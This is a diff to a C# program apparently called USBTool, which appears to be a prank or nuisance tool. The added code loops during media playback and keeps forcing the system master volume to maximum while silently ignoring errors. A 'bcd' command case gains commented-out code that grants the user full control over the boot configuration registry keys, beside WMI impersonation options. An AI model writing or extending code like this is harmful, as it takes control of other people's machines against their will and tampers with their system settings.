@@ -175,9 +175,24 @@ namespace USBTool
 									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
 									host.Hide();
 #elif MEDIA_FOUNDATION
+									Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
+									Guid guidVolume = typeof(IAudioEndpointVolume).GUID;
+									CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL,ref  guidEnumetator, out IUnknown _enumerater);
+									IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;										
 									while (state != "Prepared" & state !="Ended") { }
 									state = "Playing";
-									while (state != "Ended") {						
+									while (state != "Ended") {
+										try
+										{
+											enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
+											endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _volume);
+											IAudioEndpointVolume volume = _volume as IAudioEndpointVolume;
+											volume.SetMasterVolumeLevelScalar(1, Guid.Empty);
+										}
+                                        catch
+                                        {
+
+                                        }
 									}									
 #endif
 									break;
@@ -280,6 +295,11 @@ namespace USBTool
 									ForEachWindow(GetDesktopWindow(), "beuncle");
 									break;
 								case "bcd":
+                                    //RegistryKey bcdreg = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects");
+									//bcdreg.GetAccessControl().AddAccessRule(
+									//	new System.Security.AccessControl.RegistryAccessRule(
+									//		Environment.UserDomainName + "\\" + Environment.UserName,
+									//		System.Security.AccessControl.RegistryRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
 									var co = new ConnectionOptions
 									{
 										Impersonation = ImpersonationLevel.Impersonate,
